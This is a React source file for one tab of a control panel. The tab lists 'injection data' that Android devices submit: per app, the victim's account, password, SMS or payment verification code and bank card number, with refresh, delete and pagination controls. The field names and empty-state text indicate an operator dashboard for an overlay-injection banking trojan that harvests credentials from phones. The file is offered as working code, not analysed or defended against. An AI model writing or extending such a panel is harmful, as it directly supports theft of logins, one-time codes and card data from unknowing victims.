/**
 * 注入数据Tab - 注入数据记录表格
 * 从 ControlPage.jsx 提取
 */
import { useEffect } from 'react'
import { api } from '../../api/client'
import { toast, centerToast } from '../../utils/toast'

export default function InjectionDataTab({
  resolvedDeviceId,
  injDataList, setInjDataList,
  injDataTotal, setInjDataTotal,
  injDataPage, setInjDataPage,
  injDataSize, setInjDataSize,
  injDataLoading, setInjDataLoading,
  injDataLoaded, setInjDataLoaded,
}) {
  async function loadInjRecords(page = injDataPage, size = injDataSize) {
    setInjDataLoading(true)
    try {
      const r = await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&page=${page}&pageSize=${size}`)
      const list = r?.data?.list || r?.list || r?.data || []
      setInjDataList(Array.isArray(list) ? list : [])
      setInjDataTotal(r?.data?.total || r?.total || (Array.isArray(list) ? list.length : 0))
      setInjDataPage(page)
      setInjDataSize(size)
    } catch { setInjDataList([]); setInjDataTotal(0) }
    finally { setInjDataLoading(false) }
  }

  async function clearInjRecords() {
    if (!confirm('确定要清空所有注入数据吗？')) return
    try { await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}`, { method: 'DELETE' }); setInjDataList([]); setInjDataTotal(0); centerToast('已清空注入数据') } catch { toast('清空失败', 'error') }
  }

  useEffect(() => {
    if (!injDataLoaded && !injDataLoading) {
      setInjDataLoaded(true)
      setTimeout(() => loadInjRecords(1), 0)
    }
  }, [])

  const totalPages = Math.max(1, Math.ceil(injDataTotal / injDataSize))

  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', display: 'flex', flexDirection: 'column', height: '100%' }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ width: 4, height: 18, background: '#fa8c16', borderRadius: 2, marginRight: 8 }} />
            <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>注入数据记录</span>
            <span style={{ fontSize: 12, color: '#94a3b8', marginLeft: 8 }}>共 {injDataTotal} 条数据</span>
          </div>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 12 }}>
            <button onClick={() => loadInjRecords(1)} style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>🔄 刷新数据</button>
            <button onClick={clearInjRecords} disabled={injDataTotal === 0} style={{ padding: '6px 14px', background: injDataTotal === 0 ? 'rgba(239,68,68,.08)' : 'rgba(239,68,68,.15)', border: '1px solid rgba(239,68,68,.3)', borderRadius: 6, color: '#f87171', fontSize: 12, fontWeight: 600, cursor: injDataTotal === 0 ? 'not-allowed' : 'pointer', opacity: injDataTotal === 0 ? 0.5 : 1 }}>🗑 清空数据</button>
          </div>
          <div style={{ flex: 1, minHeight: 0, overflow: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', tableLayout: 'fixed' }}>
              <colgroup><col style={{ width: 170 }} /><col style={{ width: 180 }} /><col style={{ width: 150 }} /><col style={{ width: 120 }} /><col style={{ width: 100 }} /><col style={{ width: 140 }} /><col style={{ width: 120 }} /></colgroup>
              <thead>
                <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>时间</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用名称</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>账号</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>密码</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>验证/支付</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>银行卡</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>操作</th>
                </tr>
              </thead>
              <tbody>
                {injDataLoading ? (
                  <tr><td colSpan={7} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>加载中...</td></tr>
                ) : injDataList.length === 0 ? (
                  <tr><td colSpan={7} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>
                    <div style={{ fontSize: 40, marginBottom: 12, opacity: 0.5 }}>💉</div>
                    <div style={{ fontSize: 14 }}>暂无注入数据</div>
                    <div style={{ fontSize: 12, marginTop: 6, color: '#64748b' }}>当安卓端提交注入表单数据后，将显示在这里</div>
                  </td></tr>
                ) : (
                  injDataList.map((item, i) => {
                    const d = typeof item.data === 'string' ? (() => { try { return JSON.parse(item.data) } catch { return {} } })() : (item.data || {})
                    const account = d.account || d.username || d.login || d.email || d['\u8d26\u53f7'] || d['\u624b\u673a\u53f7'] || d['\u7528\u6237\u540d'] || ''
                    const password = d.password || d.pwd || d.pass || d['\u5bc6\u7801'] || d['\u767b\u5f55\u5bc6\u7801'] || ''
                    const verification = d.verification || d.code || d.sms || d.otp || d.payPassword || d['\u652f\u4ed8\u5bc6\u7801'] || d['\u9a8c\u8bc1\u7801'] || ''
                    const card = d.card || d.cardNumber || d.bankCard || d['\u5361\u53f7'] || d['\u94f6\u884c\u5361'] || ''
                    const typeName = d['\u7c7b\u578b'] || d.type || ''
                    return (
                      <tr key={item.id || i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '8px 12px', color: '#94a3b8', fontSize: 11, whiteSpace: 'nowrap' }}>{item.timestamp ? new Date(item.timestamp).toLocaleString('zh-CN') : item.createdAt ? new Date(item.createdAt).toLocaleString('zh-CN') : d['\u65f6\u95f4\u6233'] ? new Date(d['\u65f6\u95f4\u6233']).toLocaleString('zh-CN') : '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#e2e8f0', fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{item.packageName || item.templateName || typeName || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#38bdf8', fontSize: 12 }}>{account || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#fbbf24', fontSize: 12, fontFamily: 'monospace', fontWeight: 700 }}>{password || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#a78bfa', fontSize: 12 }}>{verification || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#f472b6', fontSize: 12 }}>{card || '--'}</td>
                        <td style={{ padding: '8px 12px' }}>
                          <button onClick={async () => { try { await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&id=${item.id}`, { method: 'DELETE' }); loadInjRecords(injDataPage); centerToast('已删除') } catch {} }} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.08)', color: '#f87171', cursor: 'pointer' }}>删除</button>
                        </td>
                      </tr>
                    )
                  })
                )}
              </tbody>
            </table>
          </div>
          <div style={{ paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.08)', display: 'flex', justifyContent: 'flex-end', alignItems: 'center', gap: 16, marginTop: 8 }}>
            <span style={{ color: '#94a3b8', fontSize: 13 }}>共{injDataTotal}条</span>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
              <button onClick={() => loadInjRecords(Math.max(1, injDataPage - 1))} disabled={injDataPage <= 1} style={{ padding: '4px 10px', background: injDataPage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: injDataPage <= 1 ? '#64748b' : '#fff', fontSize: 12, cursor: injDataPage <= 1 ? 'not-allowed' : 'pointer' }}>上一页</button>
              <span style={{ color: '#fff', fontSize: 12 }}>{injDataPage}</span>
              <button onClick={() => loadInjRecords(Math.min(totalPages, injDataPage + 1))} disabled={injDataPage >= totalPages} style={{ padding: '4px 10px', background: injDataPage >= totalPages ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: injDataPage >= totalPages ? '#64748b' : '#fff', fontSize: 12, cursor: injDataPage >= totalPages ? 'not-allowed' : 'pointer' }}>下一页</button>
              <select value={injDataSize} onChange={e => loadInjRecords(1, Number(e.target.value))} style={{ padding: '4px 8px', background: 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }}>
                <option value={20} style={{ background: '#1e293b' }}>20 条/页</option>
                <option value={50} style={{ background: '#1e293b' }}>50 条/页</option>
                <option value={100} style={{ background: '#1e293b' }}>100 条/页</option>
              </select>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
